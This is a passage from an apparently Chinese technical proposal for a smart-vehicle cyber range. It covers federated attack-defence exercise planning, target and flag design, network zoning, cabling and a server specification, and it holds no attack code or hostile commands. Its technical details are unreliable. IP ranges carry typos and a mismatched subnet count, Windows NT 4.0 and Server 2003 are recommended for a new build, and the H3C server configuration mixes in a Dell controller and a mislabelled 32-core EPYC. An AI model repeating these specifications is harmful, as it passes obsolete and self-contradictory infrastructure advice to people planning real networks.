划设计图。这些规划旨在确保联邦互联活动的网络结构和连接方式的合理性，为参与者提供稳定和安全的网络环境，以便顺利进行演练和测试。</li><li>提供创建联邦互联场景模板工程的方法。这个模板工程将作为参与者进行演练和测试的基础，包含所有必要的节点、拓扑结构、通信协议、攻击方式等信息。</li></ol><h4 id="技术实现内容-3"><a href="#技术实现内容-3" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>联邦互联靶场是一个模拟真实网络环境的虚拟训练平台，用于进行网络安全攻防演练和技术培训。它是一个由多个独立网络组成的联邦网络，每个网络都代表一个特定的组织或系统。联邦互联靶场的目标是提供一个安全、可控的环境，供安全专业人员和团队进行实际的攻击和防御操作。在联邦互联靶场中，参与者可以扮演攻击者或防御者的角色，通过模拟真实的攻击场景和漏洞利用技术，进行攻击和防御的对抗。参与者可以利用各种工具和技术，测试和评估自己的安全能力，并学习如何应对不同类型的攻击。联邦互联靶场的优势在于提供了一个安全的环境，参与者可以在其中进行实战演练，掌握实际的攻击和防御技术。它还可以模拟复杂的网络架构和环境，帮助参与者了解实际网络中的安全挑战，并提供实时的反馈和评估。通过联邦互联靶场的使用，安全专业人员和团队可以不断提升自己的技能和经验，发现和修复潜在的安全漏洞，提高网络的安全性。此外，联邦互联靶场还可以用于安全培训和认证考试，帮助人们获取和证明自己的安全专业能力。总之，联邦互联靶场是一个重要的网络安全训练和实践平台，对于提升网络安全能力和应对实际威胁具有重要意义。</p><p>联邦互联活动主要包含以下内容：</p><p><strong>联邦互联场景内容策划：</strong></p><p>联邦互联场景内容策划包括选择参与的场景，场景之间的对接和场景访问顺序。首先，根据训练目标和需求，选择适当的场景，如网络渗透、恶意软件分析、应急响应等。然后，确定场景之间的对接方式，可以是线性的，即一个场景完成后进入下一个场景；也可以是非线性的，允许参与者根据自己的选择和进展决定访问顺序。最后，提供参与者访问场景的指南，包括场景的名称、描述、访问方法和前置条件等，确保参与者按照既定顺序进行训练，并获得所需的技能和知识。这样的策划能够提供一个有组织、连贯且有针对性的联邦互联训练体验。</p><p><strong>联邦互联场景组织：</strong></p><p>联邦互联场景组织是为了实现有效的协作和交互，确保联邦互联活动的顺利进行。首先，明确互联活动的组织结构，包括参与的组织或团队，各自的角色和责任。其次，制定明确的目标和规则，确保参与者了解他们的任务和期望。流程方面，需要定义清晰的活动流程，包括场景选择、访问顺序、时间安排和交流方式等。此外，还需要建立有效的沟通和协作机制，以便参与者能够共享信息、协调行动并解决问题。通过明确的组织、目标和流程，可以确保联邦互联活动的有序进行，达到预期的训练效果。</p><p><strong>支撑搭建平台：</strong></p><p>搭建联邦互联靶场平台涉及攻击场地、防守场地、攻击目标、攻击分析中心和指挥大厅等要素。攻击场地是模拟真实网络环境的区域，包含易受攻击的系统和网络设备。防守场地是用于部署防御措施的区域，包括防火墙、入侵检测系统等。攻击目标是模拟真实系统的脆弱点，供攻击者攻击。攻击分析中心是用于收集、分析和评估攻击数据的中心，提供攻击情报和漏洞分析。指挥大厅是指挥和控制整个联邦互联活动的中心，负责协调攻击和防守的行动，收集和共享情报，指导参与者的训练。这样的联邦互联靶场平台能够提供一个实验环境，让参与者在模拟的攻防对抗中提升技能和加强安全意识。</p><p><strong>互联活动管理支撑：</strong></p><p>互联活动管理支撑包括场景定义、任务定义、任务顺序定义、队伍配置、自动环境分配、靶标分配、靶标检测工具支撑、互联活动成果实时查看、成果提交、统计排名、互联活动停止与恢复、互联活动报告与归档等方面。场景定义确定互联活动的环境和条件，任务定义明确参与者的具体任务，任务顺序定义规定任务的执行顺序。队伍配置确定参与者的组队情况，自动环境分配确保每个队伍获得适当的互联环境。靶标分配将攻击目标分配给相应的队伍，靶标检测工具支撑提供对攻击目标的检测和评估。互联活动成果实时查看使参与者能够实时查看自己和其他队伍的成果，成果提交用于提交参与者的攻击或防守成果。统计排名用于对参与者的表现进行排名和评比。互联活动停止与恢复管理活动的开始和结束，互联活动报告与归档记录互联活动的过程和结果，供后续分析和总结。这些管理支撑措施能够确保互联活动的顺利进行和有效管理。</p><p><strong>互联活动内容准备：</strong></p><p>活动内容准备包括互联活动准备的资源和人员的清晰定义。资源方面，需要准备网络设备、服务器、操作系统、应用程序等技术设施，以搭建互联活动所需的环境。此外，还需要准备模拟攻击和防御的工具、靶标系统、安全监控和分析工具等。人员方面，需要确定负责搭建和维护互联活动环境的技术人员，包括网络工程师、系统管理员和安全专家等。同时，还需要指定活动的组织者和协调者，负责活动的策划、安排和执行。他们应具备丰富的安全知识和组织能力，能够协调各方资源，确保互联活动的顺利进行。准备充分的资源和合适的人员能够为互联活动提供必要的支持和保障，确保活动的顺利进行和取得预期效果。</p><p><strong>活动策划定义：</strong></p><p>活动策划定义是指清晰定义互联活动的过程，并指导如何根据策划内容协调各个场景方，并在过程中展开监控、研判和应急处置等工作。策划内容应包括活动的目标、范围、时间安排、参与者角色和责任等方面的明确定义。在活动过程中，策划内容将指导场景方的准备工作、攻防对抗的执行和演练、成果的收集和分析等环节。同时，策划还要明确监控活动的方法和指标，以及研判攻击行为和风险的能力，以便在发现异常情况时能够及时做出应急处置。通过清晰的策划定义，可以确保互联活动的有序进行，并能够及时应对和解决可能出现的问题和风险，提高活动的效果和安全性。</p><p><strong>活动保障定义：</strong></p><p>活动保障定义包括清晰定义互联活动保障的核心工作内容，其中包括但不限于以下方面：人员安全保障，确保参与活动的人员的安全和隐私；攻击过程监控，对活动中的攻击过程进行实时监控和记录；专家研判，由专业人员对攻击行为和风险进行分析和评估；攻击过程回溯，对攻击过程进行溯源和重现，以便进行深入分析和调查；信息通告，及时向相关方通报活动的进展和结果；人员保障，提供必要的培训和支持，确保参与人员的能力和安全；资源保障，确保活动所需的技术和物资资源的供应和维护；后勤保障，提供必要的后勤支持，包括场地、设备等；应急处置，对发生的紧急情况进行及时响应和处理。通过清晰定义的活动保障，可以确保互联活动的安全性、顺利性和有效性。</p><p><strong>互联活动总结：</strong></p><p>活动总结阶段是对互联活动进行回顾和总结的阶段，其工作内容包括但不限于以下方面：互联活动回溯，对整个活动过程进行回顾和梳理，包括活动的准备、执行和结果等方面的回顾；演练总结，对演练过程进行评估和总结，包括演练的目标、设计、执行和效果等方面的总结；评估建议，根据活动的经验和教训，提出改进和优化的建议，以提升互联活动的质量和效果。通过清晰定义的活动总结，可以对互联活动进行全面的评估和反思，发现问题和不足之处，并提出具体的改进措施和建议，以便在下一次活动中能够更加顺利和有效地进行。总结阶段的工作对于活动的持续改进和提升具有重要的指导意义。</p><p><strong>风险规避措施：</strong></p><p>风险规避措施是为了降低互联活动中可能出现的安全风险和问题而采取的预防措施。以下是一些常见的互联活动风险规避措施：</p><p>安全策略和政策：制定明确的安全策略和政策，包括访问控制、身份认证、数据保护等方面的规定，确保互联活动的安全性。</p><p>强化网络安全措施：采取适当的网络安全措施，如防火墙、入侵检测系统、安全补丁管理等，保护互联活动中的网络系统和数据安全。</p><p>加密通信和数据：对互联活动中的通信和数据进行加密，确保数据在传输和存储过程中的机密性和完整性。</p><p>定期演练和测试：定期进行演练和测试，包括模拟攻击、红队/蓝队演练等，以发现潜在的安全漏洞，并及时采取措施加以修复。</p><p>供应链安全管理：加强对供应链环节的安全管理，包括对供应商的评估和监控，确保供应链中的组件和服务的安全性。</p><p><strong>联邦靶标构想：</strong></p><p>联邦靶标构想是一个包含以下要素的设想：</p><p>1. 靶标flag值：每个靶标都有一个唯一的标识符，用于在攻击者成功攻击该靶标时进行识别和验证。</p><p>2. 攻击手段：描述攻击者可以使用的方法、技术或漏洞来攻击该靶标，例如网络扫描、缓冲区溢出、跨站脚本等。</p><p>3. 得分点：指定攻击者在成功攻击该靶标时可以获得的得分或奖励，用于评估攻击者的技能和成就。</p><p>4. 是否为公用靶标：指明该靶标是否为公开可用的靶标，供多个安全测试人员或团队进行攻击和评估。</p><p>5. 靶标所属靶场：将靶标归属到特定的靶场或安全测试环境中，以便组织和管理相关的靶标和攻击活动。</p><p>6. 访问形式：描述攻击者可以访问该靶标的方式，如远程访问、本地访问、特定权限要求等。</p><p>7. 访问地址：指定攻击者可以使用的访问地址或网络位置来访问该靶标，例如IP地址、域名或URL。</p><p>通过提供这些信息，联邦靶标构想可以帮助安全测试人员或团队识别和选择适合其需求的具体靶标，并进行有针对性的攻击和评估活动。</p><p><strong>联邦互联场景：</strong></p><p>联邦互联场景是一个包含以下要素的环境描述：</p><p>1. 场景的拓扑描述：描述联邦互联环境中各个节点之间的连接和布局。包括节点名称、地址和访问端口等信息，用于指定节点的身份和访问方式。</p><p>2. 联邦靶场区域描述：指定联邦互联环境中的靶场区域的位置和特征。包括靶场所在地的描述，可以是一个实际的物理位置或虚拟环境；还包括靶标区域和网段划分，用于指定靶标所在的特定区域和相关的网络地址范围。</p><p>通过提供这些信息，联邦互联场景描述可以帮助组织和安全测试人员理解联邦互联环境的整体结构和组成部分。拓扑描述提供了节点之间的连接方式和访问信息，而联邦靶场区域描述则指定了靶场的位置和靶标所在的特定区域，为安全测试和攻击活动提供了目标和范围。这些描述有助于规划和组织联邦互联场景中的安全测试和评估活动。</p><p><strong>联邦互联场景协同：</strong></p><p>联邦互联场景协同方案可以包括以下要素：</p><p>1. 单场景协同：描述一个场景中的协同攻击方式。这包括传统攻击方式的描述，例如网络扫描、漏洞利用、社会工程等。同时，还描述场景与其他靶场协同时采用的攻击方式和攻击步骤。</p><p>2. 参考实施方案：提供一个参考的实施方案，包括节点和拓扑情况的描述，节点之间的通信协议，flag分布情况以及获取flag所需的攻击方式的简述。</p><p>在实施方案中，可以包括以下内容：</p><p>- 节点和拓扑情况：描述联邦互联场景中涉及的各个节点的名称、地址和拓扑关系，以及节点之间的连接方式和通信方式。</p><p>- 节点之间的通信协议：指定节点之间进行通信时所使用的协议，例如TCP/IP、HTTP、SSH等。</p><p>- Flag分布情况：描述flag在联邦互联场景中的分布情况，包括哪些节点上存储了flag以及它们的位置和访问方式。</p><p>- 获取flag所需的攻击方式简述：简要描述攻击者需要采用的攻击方式来获取flag，例如漏洞利用、密码破解、网络嗅探等。</p><p>通过提供这些信息，联邦互联场景协同方案可以帮助安全测试人员或团队理解和规划在联邦互联环境中的协同攻击方式和步骤。参考实施方案提供了具体的节点和拓扑情况，以及攻击者需要采用的方式来获取flag，有助于指导实际的安全测试和评估活动。</p><p><strong>联邦互联网络规划：</strong></p><p>联邦互联网络规划涉及以下要素：</p><p>1. IP地址段规划：对整体联邦互联场景中的网络进行IP地址段规划。这包括为各个节点、子网和靶场分配IP地址段，确保网络中的设备和系统能够正确地进行通信和访问。</p><p>2. VLAN划分：根据需要，对联邦互联场景中的网络进行VLAN划分。VLAN可以将网络划分为多个虚拟局域网，提供隔离和安全性。通过划分VLAN，可以对不同的节点、子网或靶场进行逻辑隔离，以保护网络的安全性和性能。</p><p>3. VPN划分规划：对联邦互联场景中的VPN进行划分规划。VPN（虚拟专用网络）可以提供安全的远程访问和通信，用于连接不同地理位置的节点和靶场。通过划分VPN，可以确保在联邦互联环境中的通信和数据传输是加密和安全的。</p><p>网络连接规划设计图可以提供整体联邦互联场景的网络拓扑图和连接方式。它显示了各个节点、子网和靶场之间的连接关系，以及它们所使用的IP地址段、VLAN划分和VPN划分规划。这样的设计图可以帮助网络管理员和安全团队更好地理解和管理联邦互联场景中的网络架构和连接配置。</p><p><strong>其他内容：</strong></p><p>根据方案在靶场中创建联邦互联场景模板工程；</p><h1 id="智能汽车网络靶场基础设施建设框架"><a href="#智能汽车网络靶场基础设施建设框架" class="headerlink" title="智能汽车网络靶场基础设施建设框架"></a>智能汽车网络靶场基础设施建设框架</h1><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>靶场基础设施包含了智能汽车网络靶场整体展示系统、网络资源设备、攻防演练大屏、攻防演练车辆台架、智能驾驶网络安全沙盘以及智能驾驶网络安全动态仿真系统。为靶场提供整体设计、装修施工、设备安装、网络规划，是靶场建设的基础。</p><h3 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h3><p>展示系统提供靶场整体设计、深化设计、施工要求、环保要求等，为靶场提供全方位的设计工作。</p><p>网络资源设备为汽车网络靶场运行提供计算性能、存储空间、网络连接和安全防护。</p><p>攻防演练大屏为汽车网络靶场运行提供高清、实时、直观的仿真验证、测试、竞赛、演练及安全运营可视化基础设施。</p><p>攻防演练车辆台架提供直观逼真的整车信息安全攻防演练及测试结果演示。</p><p>智能驾驶网络安全沙盘以及智能驾驶网络安全动态仿真系统为靶场实时逼真的智能驾驶安全研究模型与展示平台。</p><p>智能汽车网络靶场基础设施建设框架如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/760e23cec9bae43e69d92fac6038b08f.png" alt="图片包含 应用程序 描述已自动生成"></p><h3 id="系统组成"><a href="#系统组成" class="headerlink" title="系统组成"></a>系统组成</h3><table><thead><tr><th>序号</th><th>所属系统</th><th>货物分项名称</th><th>数量</th><th>备注</th></tr></thead><tbody><tr><td></td><td>靶场基础设施建设</td><td>展示系统</td><td>1套</td><td></td></tr><tr><td></td><td></td><td>网络资源设备</td><td>1套</td><td></td></tr><tr><td></td><td></td><td>攻防演练大屏</td><td>1套</td><td></td></tr><tr><td></td><td></td><td>攻防演练车辆台架</td><td>1套</td><td></td></tr><tr><td></td><td></td><td>智能驾驶网络安全沙盘</td><td>1套</td><td></td></tr><tr><td></td><td></td><td>智能驾驶网络安全动态仿真系统</td><td>1套</td><td></td></tr><tr><td></td><td>培训</td><td>展示系统培训</td><td>2人天</td><td></td></tr><tr><td></td><td></td><td>网络资源设备培训</td><td>2人天</td><td></td></tr><tr><td></td><td></td><td>攻防演练大屏</td><td>2人天</td><td></td></tr><tr><td></td><td></td><td>攻防演练车辆台架</td><td>2人天</td><td></td></tr><tr><td></td><td></td><td>智能驾驶网络安全沙盘</td><td>2人天</td><td></td></tr><tr><td></td><td></td><td>智能驾驶网络安全动态仿真系统</td><td>2人天</td><td></td></tr></tbody></table><h1 id="智能汽车网络靶场网络资源设备"><a href="#智能汽车网络靶场网络资源设备" class="headerlink" title="智能汽车网络靶场网络资源设备"></a>智能汽车网络靶场网络资源设备</h1><h2 id="技术路线-1"><a href="#技术路线-1" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="网络规划"><a href="#网络规划" class="headerlink" title="网络规划"></a>网络规划</h3><h4 id="功能实施方案-4"><a href="#功能实施方案-4" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>网络规划是一个复杂的过程，需要综合考虑技术、经济和管理等多方面的因素，他是对网络资源进行合理配置和管理的过程，以确保网络的有效性和扩展性，详见“技术实现内容”部分；</li><li>合理的网络规划应确保核心层高速稳定，汇聚层处理流量，接入层连接终端用户。IP地址须有序分配，安全策略包括防火墙和加密措施。整体设计要考虑成本效益，同时预留扩展空间，以适应未来技术升级和业务增长需求。</li><li>整体网络结构应采用分层设计，以便隔离和保护关键系统和数据，同时支持业务流程和安全需求。此外，应有备份链路和设备，以提高网络的可靠性和弹性。网络布线图和规划图的描述如下：</li></ol><ul><li><p>满足SRC平台的网络安全接入要求。在布线图和规划图中明确标明 SRC 平台的接入方式和安全策略，以确保 SRC 平台能够安全地与外部网络进行通信。</p></li><li><p>满足靶场对外众测网络使用及安全保证。在布线图和规划图中充分考虑靶场对外众测的需求，并制定相应的安全策略，以确保众测网络的使用安全。</p></li><li><p>满足靶场攻防演练场景下的对战网络需求。在布线图和规划图中明确对战网络的拓扑结构和设备配置，以确保攻防演练的顺利进行。</p></li><li><p>满足人员办公需求。在布线图和规划图中应充分考虑人员办公的网络需求，提供足够的网络接入点，并确保办公网络的稳定性和安全性。</p></li><li><p>满足不同系统之间的调用和通信。在布线图和规划图中明确各系统之间的通信协议和接口标准，以确保不同系统之间的顺畅通信。</p></li><li><p>满足网络内设备、系统、人员的正常使用。在布线图和规划图中应充分考虑设备、系统和人员的实际使用需求，提供足够的资源和支持，确保其正常运行。</p></li><li><p>核心层(Core Layer): 设立高性能的核心交换机，用于处理大量内部和外部的数据传输。核心层配置高级安全措施，如入侵检测系统(IDS)和入侵防御系统(IPS)来支持SRC平台的网络安全接入要求。</p></li><li><p>靶场网络区(Security Range Area): 设置隔离的网络区域，用于对外众测和攻防演练，配备专用的安全设备，如沙箱和蜜罐，以及独立的监控系统，确保网络使用和安全。</p></li><li><p>办公网络区(Office Area): 独立的办公网络，包括无线和有线接入点，连接至汇聚层交换机，实施访问控制策略以满足人员办公需求。</p></li><li><p>系统互联区(System Interconnect Area): 用于不同系统之间的调用和通信，包括必要的路由器和交换机，以及配置的VPN设备，确保系统间通信的安全和隔离。</p></li><li><p>接入层(Access Layer): 多个接入层交换机分布于各个办公区和靶场区，为设备、系统、人员提供网络接入点。</p></li><li><p>安全措施: 部署统一威胁管理(UTM)、防火墙、安全信息和事件管理(SIEM)系统，实施严格的访问控制列表(ACL)和安全策略。</p></li><li><p>管理与监控: 网络管理系统(NMS)用于监控网络性能和设备状态，确保网络的正常运行。</p><p>网络规划合理性体现在其分层结构设计，确保了不同业务需求和安全级别的隔离与管理。核心层的高性能交换机保障了数据中心的高速数据处理能力，适应了SRC平台的高负载需求。靶场网络区的隔离设计允许安全的对外众测和攻防演练，同时限制了潜在的安全威胁扩散。办公网络区的独立设置满足了日常办公的网络需求，同时通过接入控制保障了业务数据的安全。系统互联区的设计为不同系统间的通信提供了安全的数据交换环境。接入层的分布式部署确保了网络接入的广泛性和便捷性。整体规划中的安全措施，如UTM、防火墙、SIEM系统，提升了网络的安全性。网络管理系统(NMS)的使用加强了网络的监控与管理能力，确保了网络的稳定运行。此外，备份链路和设备的设置提高了网络的可靠性和弹性，保障了业务连续性。整体规划考虑了网络的分层、隔离、安全、可靠性和弹性，是一个可行的网络解决方案。</p></li></ul><ol><li>为确保方案的有效性和可行性，提供的方案确保经过审核。对方案的合理性、可行性、安全性等方面进行全面评估，以确保所提供的方案能够满足实际需求并具有实施价值。这一审核过程也有助于双方就方案达成共识，为后续的网络建设奠定良好基础。</li></ol><h4 id="技术实现内容-4"><a href="#技术实现内容-4" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><ol><li>用户需求分析</li></ol><p>为满足实验室网络需求，需要根据靶场建设内容进行网络规划，靶场用网需求包含机房各服务器、交换机设备、防火墙设备、靶场测试工具、靶场堡垒机、展示区沙盘、智能驾驶座舱、工作站、靶场大屏、办公网络等，另外除了内部网络需求之外，还需要考虑与外部网络之间的通路和映射关系，外网需求包含SRC平台开展的众测活动、基于靶场攻防演练的对战网络、以及与鹏城实验室的靶场互联网络；</p><ol><li>网络拓扑设计</li></ol><p>局域网采用星型网络拓朴结构，星型拓朴结构为现在较为流行的一种网络结构，它是以一台中心处理机（通信设备）为主而构成的网络，其它入网机器仅与该中心处理机之间有直接的物理链路，中心处理机采用分时或轮询的方法为入网机器服务，所有的数据必须经过中心处理机。由于所有节点的往外传输都必须经过中央节点来处理，因此，对中央节点的要求比较高。</p><p>优点是网络结构简单，易于维护，便于管理（集中式）；每台入网机均需物理线路与处理机互连，线路利用率低；处理机负载重（需处理所有的服务），因为任何两台入网机之间交换信息，都必须通过中心处理机；入网主机故障不影响整个网络的正常工作。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/75ba2853d7aaa83831ebfb909c66e054.png"></p><p>网络规划图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/58422d9f02037f7ce65e59525e8bb0a5.png" alt="1703488289637"></p><p>网络布线图</p><ol><li>网络规划设计</li></ol><p>1）、采用IP地址规划，用子网掩码区别各工作区。</p><p>一共3个工作区，采用C类地址，需要8个网段，划分如下：</p><table><thead><tr><th>工作部门</th><th>所属网段</th><th>IP地址</th></tr></thead><tbody><tr><td>机房区</td><td>202.10.10.32-63(vlan1)</td><td>202.10.10.34</td></tr><tr><td>办公区</td><td>202.10.10.64-95(vlan2)</td><td>202.10.10.66—202.110.10.67</td></tr><tr><td>靶场区</td><td>202.10.10.96-127(vlan3)</td><td>202.10.10.98—202.110.10.101</td></tr></tbody></table><p>2）、将机房区、办公区、靶场去划分为VLAN，用路由器做VLAN之间的路由。交换机有24个端口，按照3个人分区的设备类型进行划分。</p><p>3）、用路由器定义访问控制列表来实现访问权限</p><ol><li>操作系统的选择</li></ol><p>网络操作系统的选择：以Microsoft Windows NT Server 4.0为主，它是发展速度最快的集成了Web应用的网络操作系统。具有界面友好、系统强壮、稳定可靠、与桌面主流操作系统相容性好等优点。并拥有大量的基于NT的服务器端软件，是Intranet网络中最佳的网络操作系统平台。</p><p>WindowsNT具有如下一些特点:服务器端的多硬件平台支持;文件及打印共享;适合于分布应用:用NT编写的分布式应用程序可以跨接到其它系统;内置良好的安全措施与先进的容错能力;内置的Internet/Intranet功能,及使用方案;开放式网络服务接口,用户可访问多个计算机环境的信息,获得更为广泛的服务。</p><p>PC操作系统：WINDOWS XP,或者WINDOWS 2000 PRO优点普及率高，图文界面，操作简单，配置方便，支持多种网络协议，相应的配套软件丰富。而且部分商用机随即发售，节约成本。</p><p>服务器操作系统：Windows Server 2003 Enterprise Edition图文界面，操作简单，配置方便，支持多种网络协议。</p><ol><li>接入方式设计</li></ol><p>除了与鹏城实验室的互联网专线外，均采用本地网络，互联网专线采用500M。</p><h3 id="网络布线"><a href="#网络布线" class="headerlink" title="网络布线"></a>网络布线</h3><h4 id="功能实施方案-5"><a href="#功能实施方案-5" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>网络布线方案采用了分层架构，核心层使用光纤连接以支持高速数据传输。靶场和办公区通过汇聚层交换机连接到核心层，使用标准以太网。接入层交换机为末端用户和设备提供接入点，使用星形拓扑布线以便管理和故障隔离。详见“技术实现内容”；</li><li>布线方案合理性体现在其分层和星形拓扑结构，确保了高效的数据流动和易于管理的网络结构。核心层的光纤布线提供了高带宽和低延迟，适应核心数据处理需求。星形拓扑简化了末端设备的连接，便于监控和快速定位问题，同时汇聚层的设计优化了数据流向和网络性能。</li><li>超五类非屏蔽双绞线（Cat5e UTP）是一种以太网布线标准，支持高达1Gbps的数据传输速率和100MHz的带宽。它由四对双绞铜线组成，每对线通过特定的绞合方式减少电磁干扰。Cat5e UTP相较于旧版Cat5线缆，具有更好的抗干扰性能和信号稳定性，广泛用于局域网（LAN）和电话线路中。</li><li>符合强弱电铺设国标规范要求，意味着强电与弱电线路分开敷设，保持一定距离，使用专用管道或桥架，确保电磁干扰最小化，并遵守相应的安全和环境标准。</li><li>在布线实施过程中，对不同网络节点的链接方式进行标注是指明确记录每个网络连接点、交换机、路由器、终端等设备的接口类型和位置，使用标签或图示来指示它们之间的连接关系，确保网络布局的清晰性和未来维护的便捷性。</li></ol><h4 id="技术实现内容-5"><a href="#技术实现内容-5" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>网络靶场建设网络布线包含强弱电设计，均考虑从机房下电下网，走线方式采用地埋式走线；</p><p>强电设计：从机房配电箱出线，将线引至各用电设备处后再连接地插出电，空开按照分区设计；</p><p>弱电设计：从机房核心交换机处通过网线连接办公区和靶场区的汇聚交换机，再由汇聚交换机连接到各用网设备；</p><p>设计图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/58422d9f02037f7ce65e59525e8bb0a5.png" alt="1703488355071"></p><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><ol><li>选用2022年国内IDC排名前三的服务器；</li><li>采用机柜式，提供安装辅件及套件</li><li>提供所投产品品牌、型号、数量及产品功能参数信息。</li></ol><p>选择华三的机架式服务器，这种服务器适用于数据中心和机房环境。提供安装辅材和套件，以便后续进行服务器的安装和部署。</p><h4 id="应用服务器"><a href="#应用服务器" class="headerlink" title="应用服务器"></a>应用服务器</h4><h5 id="功能实施方案-6"><a href="#功能实施方案-6" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供4台品牌为H3C新华三，型号为UniServer R4950 G5的2U机架式应用服务器。</p><p>产品功能参数：</p><ol><li>处理器：64核；64核处理器的设计通常采用先进的制造工艺，以实现更高的能效比和计算密度。使用64核处理器时，操作系统和应用程序需要能够支持多核并发，以充分利用其性能。</li><li>满足内存256G DDR4；256GB DDR4内存特性：容量大、数据传输数率高、工作能效高、支持更高的密度和更大的单模块容量、有个更高的可靠性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4bd3747f0f89bb4f8de0864fa1a7249c.png"></p><ol><li>16个内存插槽。每个处理器支持8个内存通道, 每个通道最大支持1个内存插槽。16个内存插槽使得系统能够支持极大的内存容量，多通道可以显著提高内存的数据吞吐量；这种内存架构提供了高度的可扩展性和性能。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9be5d2d0efee35310b7a3c972ecb5b83.png"></p><ol><li>系统支持高速内存，达到3200MT/s的数据速率，兼容RDIMM（Registered DIMM）和具备备用电源或非易失性功能的NVDIMM，确保了内存的速度与数据的安全性和持久性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/38d5ce7e17fa880e5717dcc16a0d844a.png"></p><ol><li>满足硬盘16TB SATA2，其提供巨大的存储容量，适合大规模数据存储需求，且成本相对较低，兼容性好，适用于多种系统。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6675be7f5e4a5ca1f0843ed923a49c73.png"></p><ol><li>满足硬盘512G SSD，速度快，响应时间短，耗电量低，抗震性强，且体积小，便于携带，提升了系统的整体性能和可靠性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/14421e92995eea2adf4377e39da851cd.png"></p><ol><li>支持24个2.5英寸/3.5英寸SAS/SATA硬盘支持热插拔；同时确保无停机维护和数据冗余，增强了数据中心的可用性和可靠性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/aee5c20c5163cc7da527fbcbe44a94c6.png"></p><ol><li>支持2个 M.2 SSD或2个 E1.S SSD存储模块，他可以提供快速的数据访问速度，小巧的体积，以及通过模块化设计简化升级和维护，提高了系统的灵活性和性能。</li><li>交流冗余电源提高了系统的可靠性和稳定性，确保了在主电源故障时能够无缝切换到备用电源，从而减少系统停机时间，保障关键业务的连续运行。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3b68082017b2e00c9201b9d47e0c69ae.png"></p><ol><li>具备千兆网卡4电口及1个万兆网卡的系统，能够提供高带宽网络连接，满足大数据传输需求，同时支持网络冗余和负载均衡，增强网络的可靠性和效率。</li><li>支持扩展插槽 4 个PCI-E 插槽或2 个PCI-X 和2 个PCI-E插槽</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c1895fbf85b4d866bae6888430cf149.png"></p><ol><li>2个后置USB3.0，+1个后置VGA，+1个COM口</li><li>满足存储控制器RAID1 或1+0，带读写高速缓存128M</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/978ea2dc9eeb97a428b03aee9994d452.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b0af2296cba3de862c3f39d0bf36cccd.png"></p><h5 id="应用服务器配置方案"><a href="#应用服务器配置方案" class="headerlink" title="应用服务器配置方案"></a>应用服务器配置方案</h5><ol><li>处理器</li></ol><p>型号：2x AMD EPYC 7763 32-Core Processor</p><p>核心：共64核心，支持128线程</p><ol><li>内存</li></ol><p>容量与型号：16x 16GB Samsung DDR4-3200 RDIMM PC4-25600R</p><p>插槽数量：16个（每个处理器对应8个插槽）</p><p>速度：3200MT/s</p><p>类型：内存模块支持BPS/NVDIMM和RDIMM</p><ol><li>硬盘</li></ol><p>16TB SATA HDD：Seagate Exos X16 16TB Enterprise HDD</p><p>512GB SSD：Samsung 970 PRO 512GB NVMe M.2</p><ol><li>硬盘扩展</li></ol><p>硬盘槽：支持24个2.5英寸/3.5英寸SAS/SATA硬盘槽，支持热插拔</p><p>M.2 SSD选项：Samsung 970 EVO Plus NVMe M.2</p><p>E1.S SSD选项：Intel Optane SSD DC P4801X Series</p><ol><li>存储控制器</li></ol><p>型号：Dell PERC H730P RAID Controller</p><p>支持RAID 1或1+0</p><p>缓存：1GB NV Cache</p><ol><li>网络</li></ol><p>千兆网卡：4x Intel I350 Quad-Port Gigabit Network Daughter Card</p><p>万兆网卡：1x Mellanox ConnectX-4 Lx 10GbE SFP+</p><ol><li>扩展插槽</li></ol><p>4x PCI-E 4.0 x16插槽</p><ol><li>USB端口</li></ol><p>后置USB 3.0端口：2x USB 3.0 Type-A</p><ol><li>视频输出</li></ol><p>后置VGA端口：1x VGA port (integrated ASPEED AST2500)</p><ol><li>串行端口</li></ol><p>COM口：1x RS-232</p><ol><li>存储卡</li></ol><p>TF卡：2x Transcend 4GB Industrial MicroSDHC 